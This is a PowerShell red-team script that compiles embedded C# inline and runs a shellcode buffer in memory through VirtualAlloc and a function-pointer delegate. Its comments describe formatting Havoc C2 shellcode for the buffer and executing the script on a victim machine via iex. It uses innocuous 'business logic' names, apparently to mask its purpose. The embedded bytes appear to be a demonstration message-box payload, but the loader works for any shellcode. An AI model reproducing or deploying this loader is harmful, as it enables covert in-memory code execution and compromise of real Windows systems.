# Author: thec0nci3rge
# The inline technique idea came from John Hammond's video: https://www.youtube.com/watch?v=EwEwRLedeKI
# The original C# snipped was found here: https://github.com/tbhaxor/CSharp-and-Infosec/blob/main/PInvoke%20MSF%20Payload/Program.
# https://payload.cafe/2022/10/02/havoc-c2-intro-inline-csharp-compilation-within-powershell/


# Apply correct format to Havoc Shellcode
    # xxd -p sh3llc0de.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > sh3llc0de.payload
#Get-Payload Size:
    #cat sh3llc0de.payload | tr ',' ' ' | wc -w
#Execute inside vistim 
    #cat -raw .\business_logic.ps1 | iex


$MyBusinessLogic = @"
using System;
using System.Runtime.InteropServices;

class MyBusinessLogic {
    static byte[] my_buf = new byte[334] {0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x35,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x69,0x20,0x66,0x72,0x6f,0x6d,0x20,0x52,0x65,0x64,0x20,0x54,0x65,0x61,0x6d,0x20,0x4f,0x70,0x65,0x72,0x61,0x74,0x6f,0x72,0x21,0x00,0x52,0x54,0x4f,0x3a,0x20,0x4d,0x61,0x6c,0x44,0x65,0x76,0x00};

    // declaring VirtualAlloc function from kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);

    // create delegate signature for executor function
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();

    public static void Main() {
        // get pointer of allocated buffer
        IntPtr my_virt_alloc_pointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(my_buf.Length), 0x1000, 0x40);
        
        // write the buffer into memory
        Marshal.Copy(my_buf, 0x0, my_virt_alloc_pointer, my_buf.Length);
        
        // get function pointer of the allocated buffer
        WindowRun business_run_logic = Marshal.GetDelegateForFunctionPointer<WindowRun>(my_virt_alloc_pointer);
        
        // run "business-logic"
        business_run_logic();
    }
}
"@

# specifying Add-Type will force .NET to compile C# code
# Add-Type $MyBusinessLogic

[MyBusinessLogic]::Main()
